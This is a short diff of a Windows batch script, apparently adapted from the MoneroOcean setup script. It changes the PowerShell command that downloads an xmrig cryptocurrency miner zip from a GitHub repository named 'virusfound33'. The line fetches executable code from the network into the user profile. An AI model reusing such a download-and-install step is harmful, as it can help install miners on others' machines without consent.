@@ -201,7 +201,7 @@ rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
 echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/virusfound33/my2/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/virusfound33/my2/blob/master/xmrig.zip?raw=true', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download MoneroOcean advanced version of xmrig
   goto MINER_BAD
